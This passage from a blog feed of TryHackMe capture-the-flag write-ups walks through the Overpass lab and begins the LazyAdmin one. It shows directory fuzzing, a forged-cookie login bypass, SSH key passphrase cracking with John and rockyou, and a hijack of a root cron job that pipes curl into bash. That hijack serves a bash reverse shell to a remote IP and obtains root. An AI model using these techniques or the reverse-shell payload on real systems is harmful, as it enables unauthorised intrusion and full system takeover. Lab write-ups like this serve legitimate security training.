&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.192.193/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aboutus &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">admin &lt;span class="o">[&lt;/span>Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">css &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">downloads &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 71ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">img &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">338&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:36&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Going into the admin page I got meeted with a login form.&lt;/p>
&lt;p>This login form loads a script:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">statusOrCookie&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s2">&amp;#34;Incorrect credentials&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> loginStatus.textContent &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;Incorrect Credentials&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> passwordBox.value&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Cookies.set&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;SessionToken&amp;#34;&lt;/span>,statusOrCookie&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> window.location &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;/admin&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This script bascially allows you to create a token named SessionToken, and make a value different from “Incorrect credentials” and gives you access in the admin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>We found out a ssh key, now I am going to try and access james account with it:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chmod &lt;span class="m">400&lt;/span> id_rsa
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ssh -i id_rsa james@10.10.192.193
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter passphrase &lt;span class="k">for&lt;/span> key &lt;span class="s1">&amp;#39;id_rsa&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Seems like it wants a passphrase.&lt;/p>
&lt;p>We can retrieve that with John:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh2john id_rsa &amp;gt; id.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ john --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt id.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>SSH, SSH private key &lt;span class="o">[&lt;/span>RSA/DSA/EC/OPENSSH 32/64&lt;span class="o">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>KDF/cipher &lt;span class="o">[&lt;/span>&lt;span class="nv">0&lt;/span>&lt;span class="o">=&lt;/span>MD5/AES &lt;span class="nv">1&lt;/span>&lt;span class="o">=&lt;/span>MD5/3DES &lt;span class="nv">2&lt;/span>&lt;span class="o">=&lt;/span>Bcrypt/AES&lt;span class="o">])&lt;/span> is &lt;span class="m">0&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">2&lt;/span> &lt;span class="o">(&lt;/span>iteration count&lt;span class="o">)&lt;/span> is &lt;span class="m">1&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">4&lt;/span> OpenMP threads
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;redacted&amp;gt; &lt;span class="o">(&lt;/span>id_rsa&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1g 0:00:00:00 DONE &lt;span class="o">(&lt;/span>2024-01-01 09:58&lt;span class="o">)&lt;/span> 100.0g/s 1337Kp/s 1337Kc/s 1337KC/s pimentel..handball
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use the &lt;span class="s2">&amp;#34;--show&amp;#34;&lt;/span> option to display all of the cracked passwords reliably
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session completed.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And it worked:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh -i id_rsa james@10.10.192.193
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter passphrase &lt;span class="k">for&lt;/span> key &lt;span class="s1">&amp;#39;id_rsa&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 18.04.4 LTS &lt;span class="o">(&lt;/span>GNU/Linux 4.15.0-108-generic x86_64&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System information as of Mon Jan &lt;span class="m">1&lt;/span> 15:00:25 UTC &lt;span class="m">2024&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System load: 0.12 Processes: &lt;span class="m">88&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Usage of /: 22.3% of 18.57GB Users logged in: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Memory usage: 13% IP address &lt;span class="k">for&lt;/span> eth0: 10.10.192.193
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Swap usage: 0%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">47&lt;/span> packages can be updated.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> updates are security updates.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Sat Jun &lt;span class="m">27&lt;/span> 04:45:40 &lt;span class="m">2020&lt;/span> from 192.168.170.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">james@overpass-prod:~$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">james
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Once there I found this, in the .overpass file:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[{&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;System&amp;#34;&lt;/span>,&lt;span class="s2">&amp;#34;pass&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;saydrawnlyingpicture&amp;#34;&lt;/span>&lt;span class="o">}]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Which is James’s password&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/crontab
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># /etc/crontab: system-wide crontab&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># command to install the new version when you edit this file&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># and files in /etc/cron.d. These files also have username fields,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># that none of the other crontabs do.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SHELL&lt;/span>&lt;span class="o">=&lt;/span>/bin/sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># m h dom mon dow user command&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">17&lt;/span> * * * * root &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.hourly
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">25&lt;/span> &lt;span class="m">6&lt;/span> * * * root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.daily &lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">47&lt;/span> &lt;span class="m">6&lt;/span> * * &lt;span class="m">7&lt;/span> root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.weekly &lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">52&lt;/span> &lt;span class="m">6&lt;/span> &lt;span class="m">1&lt;/span> * * root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.monthly &lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Update builds from latest code&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">* * * * * root curl overpass.thm/downloads/src/buildscript.sh &lt;span class="p">|&lt;/span> bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Looks like there is a crontab running which uses curl totake the buildscript.sh and run that.&lt;/p>
&lt;p>From there I just edited the /etc/hosts file and I addes my IP, so now when it will try to retrieve the script, it will retrive it from me.&lt;/p>
&lt;p>So I made this script inside a /downloads/src/ folder:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat buildscript.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#!/bin/bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/bash -i &amp;gt;&lt;span class="p">&amp;amp;&lt;/span> /dev/tcp/10.18.20.116/5555 0&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So when I started the server it took my script and I got a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">5555&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">5555&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.192.193&lt;span class="o">]&lt;/span> &lt;span class="m">39270&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: cannot &lt;span class="nb">set&lt;/span> terminal process group &lt;span class="o">(&lt;/span>2104&lt;span class="o">)&lt;/span>: Inappropriate ioctl &lt;span class="k">for&lt;/span> device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: no job control in this shell
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@overpass-prod:~# whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>LazyAdmin Writeup THM</title><link>https://simonefelici.github.io/p/lazyadmin-writeup-thm/</link><pubDate>Tue, 02 Jan 2024 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/lazyadmin-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1494256997604-768d1f608cac?q=80&amp;w=2729&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post LazyAdmin Writeup THM" />&lt;p>The first thing that I am going to do is a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.10.243.20
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-01 07:27 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.243.20
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.073s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 10.41 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>From there we can see that it has:&lt;/p>
&lt;ul>
&lt;li>22(SSH)&lt;/li>
&lt;li>80(HTTP)&lt;/li>
&lt;/ul>
&lt;p>First of all I am going to explore the web page.&lt;/p>
&lt;p>We got meeted by the apache2 ubuntu default page, that’s good, because now weknow that it is an ubuntu machine and it’s running Apache2.&lt;/p>
&lt;p>Now I am just going to run ffuf for directory enumeration:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.243.20/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
